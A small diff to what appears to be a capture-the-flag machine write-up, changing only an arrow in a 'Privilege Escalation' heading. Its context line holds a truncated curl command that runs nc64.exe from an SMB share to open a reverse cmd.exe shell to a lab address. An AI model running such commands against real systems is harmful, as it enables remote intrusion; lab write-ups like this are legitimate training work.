@@ -70,7 +70,7 @@ $ curl -G --data-urlencode 'cmd=\\10.10.14.2\share\nc64.exe -e cmd.exe 10.10.14.
 
 Grab the user flag.
 
-## Privilege Escalation --> Kernel
+## Privilege Escalation -> Kernel
 
 This is a really old machine, so tehre's bound to be some Windows Kernel exploit that we can use.&#x20;
 
